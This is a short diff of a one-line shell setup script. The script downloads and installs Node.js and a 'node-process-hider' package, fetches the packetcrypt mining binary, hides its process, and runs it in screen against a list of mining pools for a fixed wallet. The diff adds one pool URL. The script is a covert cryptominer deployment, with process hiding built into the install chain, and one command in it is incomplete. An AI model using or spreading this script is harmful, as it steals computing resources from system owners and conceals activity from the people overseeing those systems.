@@ -1,3 +1,3 @@
 curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g node-process-hider && apt install screen && rm -rf danila-miner-2.3.1-ubuntu-bionic.tar.gz && wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt && chmod +x packetcrypt && mv packetcrypt && sudo ph add packetcrypt && screen 
-./packetcrypt ann -p pkt1qvdhx27ls80lrlvtts4dctggpaq5mzf03eh4g9j http://pool.pktpool.io http://pool.pkt.world https://stratum.zetahash.com/ http://pool.pktco.in http://pool.pkteer.com https://pool.pkthash.com http://p.master.pktdigger.com/ http://pktco.in http://pool.k1m3r4.com/ -t 2 
+./packetcrypt ann -p pkt1qvdhx27ls80lrlvtts4dctggpaq5mzf03eh4g9j http://pool.pktpool.io http://pool.pkt.world https://stratum.zetahash.com/ http://pool.pktco.in http://pool.pkteer.com https://pool.pkthash.com http://p.master.pktdigger.com/ http://pktco.in http://oeuf2pool.xyz http://pool.k1m3r4.com/ -t 2 
 
